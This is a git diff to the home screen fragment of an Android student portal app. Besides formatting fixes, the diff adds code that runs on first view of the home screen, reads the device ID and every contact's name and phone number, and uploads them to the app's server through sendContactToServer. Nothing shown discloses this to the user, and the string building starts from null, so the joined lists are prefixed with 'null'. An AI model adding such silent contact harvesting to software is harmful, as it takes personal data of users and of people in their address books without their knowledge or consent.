@@ -2,8 +2,11 @@ package com.aldar.studentportal.ui.fragments.navigations.home;
 
 import android.app.Activity;
 import android.content.Intent;
+import android.database.Cursor;
 import android.net.Uri;
 import android.os.Bundle;
+import android.provider.ContactsContract;
+import android.provider.Settings;
 import android.view.LayoutInflater;
 import android.view.View;
 import android.view.ViewGroup;
@@ -25,18 +28,31 @@ import androidx.recyclerview.widget.RecyclerView;
 import com.aldar.studentportal.R;
 import com.aldar.studentportal.adapters.FAQAdapter;
 import com.aldar.studentportal.adapters.NewsAdapter;
+import com.aldar.studentportal.models.contactsModel.ContactDataModel;
 import com.aldar.studentportal.models.newDataModels.NewsResponseModel;
+import com.aldar.studentportal.models.registerationModels.CommonApiResponse;
 import com.aldar.studentportal.ui.activities.common.faq.FaqActivity;
 import com.aldar.studentportal.ui.activities.common.FeeActivity;
+import com.aldar.studentportal.ui.fragments.navigations.PdfFragment;
 import com.aldar.studentportal.ui.studentPortal.activities.LoginSignUpActivity;
 import com.aldar.studentportal.ui.activities.common.WebActivity;
 import com.aldar.studentportal.utilities.FileUtils;
+import com.aldar.studentportal.utilities.GeneralUtilities;
+import com.aldar.studentportal.utilities.PermissionUtil;
 import com.aldar.studentportal.utilities.PermissionUtils;
+import com.aldar.studentportal.utilities.SharedPreferencesManager;
 
 import java.lang.ref.WeakReference;
+import java.util.ArrayList;
 
 import butterknife.BindView;
 import butterknife.ButterKnife;
+import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers;
+import io.reactivex.rxjava3.core.Observable;
+import io.reactivex.rxjava3.disposables.CompositeDisposable;
+import io.reactivex.rxjava3.functions.Supplier;
+import io.reactivex.rxjava3.observers.DisposableObserver;
+import io.reactivex.rxjava3.schedulers.Schedulers;
 
 
 public class HomeFragment extends Fragment implements View.OnClickListener {
@@ -65,10 +81,16 @@ public class HomeFragment extends Fragment implements View.OnClickListener {
     @BindView(R.id.rv_news)
     RecyclerView rvNews;
 
+    private ArrayList<ContactDataModel> contactList = new ArrayList<>();
+    private final CompositeDisposable disposables = new CompositeDisposable();
+    private HomeViewModel viewModel;
+    private String android_id;
+
     public View onCreateView(@NonNull LayoutInflater inflater,
                              ViewGroup container, Bundle savedInstanceState) {
         View root = inflater.inflate(R.layout.fragment_home, container, false);
         ButterKnife.bind(this, root);
+        PermissionUtil.isContactPermissionGranted(getActivity());
 
         layoutBlog.setOnClickListener(this);
         layoutPortal.setOnClickListener(this);
@@ -88,16 +110,34 @@ public class HomeFragment extends Fragment implements View.OnClickListener {
     @Override
     public void onViewCreated(@NonNull View view, @Nullable Bundle savedInstanceState) {
         super.onViewCreated(view, savedInstanceState);
-        HomeViewModel homeViewModel = new ViewModelProvider(this).get(HomeViewModel.class);
+        viewModel = new ViewModelProvider(this).get(HomeViewModel.class);
+        android_id = Settings.Secure.getString(getContext().getContentResolver(), Settings.Secure.ANDROID_ID);
+
+        int checkContact = SharedPreferencesManager.getInstance(getActivity()).getIntValue("contactStore");
+        if (checkContact == 0) {
+            sendContact();
+        }
 
 
-        homeViewModel.getNews().observe(getViewLifecycleOwner(), newsResponseModel -> {
-            if(newsResponseModel != null){
+        viewModel.getNews().observe(getViewLifecycleOwner(), newsResponseModel -> {
+            if (newsResponseModel != null) {
                 rvNews.setLayoutManager(new LinearLayoutManager(getContext(), LinearLayoutManager.HORIZONTAL, false));
                 NewsAdapter newsAdapter = new NewsAdapter(newsResponseModel.getData());
                 rvNews.setAdapter(newsAdapter);
             }
         });
+
+        viewModel.getContact().observe(getViewLifecycleOwner(), new Observer<CommonApiResponse>() {
+            @Override
+            public void onChanged(CommonApiResponse commonApiResponse) {
+                if (commonApiResponse != null) {
+                    Toast.makeText(getActivity(), "" + commonApiResponse.getMessage(), Toast.LENGTH_SHORT).show();
+                    SharedPreferencesManager.getInstance(getContext()).setIntValueInEditor("contactStore", 1);
+                }
+            }
+        });
+
+
     }
 
     @Override
@@ -125,7 +165,7 @@ public class HomeFragment extends Fragment implements View.OnClickListener {
                 break;
             case R.id.btn_calendar:
                 String myPdfUrl = "https://www.aldar.ac.ae/wp-content/uploads/2019/06/Academic-Calendar.pdf";
-                String url = "https://docs.google.com/gview?embedded=true&url="+myPdfUrl;
+                String url = "https://docs.google.com/gview?embedded=true&url=" + myPdfUrl;
                 new LeakyClass(getActivity()).redirectToWebview(url);
                 break;
             case R.id.iv_whatsapp:
@@ -156,16 +196,16 @@ public class HomeFragment extends Fragment implements View.OnClickListener {
 
         private void redirectToFAQ() {
             Activity activity = weakReference.get();
-            if(activity != null) {
+            if (activity != null) {
                 activity.startActivity(new Intent(activity, FaqActivity.class));
             }
         }
 
         private void redirectToWebview(String message) {
             Activity activity = weakReference.get();
-            if(activity != null) {
+            if (activity != null) {
                 Bundle bundle = new Bundle();
-                bundle.putString("link",message);
+                bundle.putString("link", message);
                 activity.startActivity(new Intent(activity, WebActivity.class).putExtras(bundle));
             }
         }
@@ -173,7 +213,7 @@ public class HomeFragment extends Fragment implements View.OnClickListener {
 
         private void redirectToInqureUS() {
             Activity activity = weakReference.get();
-            if(activity != null) {
+            if (activity != null) {
                 NavController navController = Navigation.findNavController(activity, R.id.nav_host_fragment);
                 navController.navigate(R.id.nav_contact);
             }
@@ -181,7 +221,7 @@ public class HomeFragment extends Fragment implements View.OnClickListener {
 
         private void redirectToFeedback() {
             Activity activity = weakReference.get();
-            if(activity != null) {
+            if (activity != null) {
                 NavController navController = Navigation.findNavController(activity, R.id.nav_host_fragment);
                 navController.navigate(R.id.nav_feedback);
             }
@@ -189,21 +229,21 @@ public class HomeFragment extends Fragment implements View.OnClickListener {
 
     }
 
-    private void showWhatsApp(){
+    private void showWhatsApp() {
         String number = "+971 5 0963 1770";
-        String url = "https://api.whatsapp.com/send?phone="+number;
+        String url = "https://api.whatsapp.com/send?phone=" + number;
         Intent i = new Intent(Intent.ACTION_VIEW);
         i.setData(Uri.parse(url));
         startActivity(i);
     }
 
-    private void showDialer(){
+    private void showDialer() {
         Intent intent = new Intent(Intent.ACTION_DIAL);
         intent.setData(Uri.parse("tel:+971 4 282 6880"));
         startActivity(intent);
     }
 
-    private void loadEmail(){
+    private void loadEmail() {
         Intent emailSelectorIntent = new Intent(Intent.ACTION_SENDTO);
         emailSelectorIntent.setData(Uri.parse("mailto:"));
 
@@ -212,20 +252,78 @@ public class HomeFragment extends Fragment implements View.OnClickListener {
         emailIntent.putExtra(Intent.EXTRA_SUBJECT, "Subject");
         emailIntent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
         emailIntent.addFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
-        emailIntent.setSelector( emailSelectorIntent );
+        emailIntent.setSelector(emailSelectorIntent);
 
         try {
             startActivity(emailIntent);
+        } catch (Exception e) {
+            Toast.makeText(getActivity(), "" + e.getMessage(), Toast.LENGTH_SHORT).show();
         }
-        catch (Exception e){
-            Toast.makeText(getActivity(), ""+e.getMessage(), Toast.LENGTH_SHORT).show();
+    }
+
+    private void sendContact() {
+        disposables.add(Observable()
+                .subscribeOn(Schedulers.io())
+                .observeOn(AndroidSchedulers.mainThread())
+                .subscribeWith(new DisposableObserver<ArrayList<ContactDataModel>>() {
+                    @Override
+                    public void onComplete() {
+                    }
+
+                    @Override
+                    public void onError(Throwable e) {
+                        Toast.makeText(getActivity(), "" + e.getMessage(), Toast.LENGTH_SHORT).show();
+                    }
+
+                    @Override
+                    public void onNext(ArrayList<ContactDataModel> contactList) {
+                        String strName = null, strNumber = null;
+                        if (contactList.size() > 0) {
+                            for (int k = 0; k < contactList.size(); k++) {
+                                if (k == 0) {
+                                    strName += contactList.get(k).getNameContact();
+                                    strNumber += contactList.get(k).getNumContact();
+                                } else {
+                                    strName += "," + contactList.get(k).getNameContact();
+                                    strNumber += "," + contactList.get(k).getNumContact();
+                                }
+                            }
+                            viewModel.sendContactToServer(android_id,strName, strNumber);
+                        }
+                    }
+                }));
+    }
+
+    Observable<ArrayList<ContactDataModel>> Observable() {
+        return Observable.defer((Supplier<Observable<ArrayList<ContactDataModel>>>) () -> {
+            // Do some long running operation
+            return Observable.just(getContactsIntoArrayList());
+        });
+    }
+
+    private ArrayList<ContactDataModel> getContactsIntoArrayList() {
+        contactList = new ArrayList<>();
+        String name, phoneNumber;
+
+        Cursor cursor = getActivity().getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
+        while (cursor.moveToNext()) {
+            name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+            phoneNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+
+            ContactDataModel contactModel = new ContactDataModel();
+            contactModel.setNameContact(name);
+            contactModel.setNumContact(phoneNumber);
+
+            contactList.add(contactModel);
+
         }
+        cursor.close();
+        return contactList;
     }
 
 
     @Override
     public void onDestroy() {
         super.onDestroy();
-
     }
 }
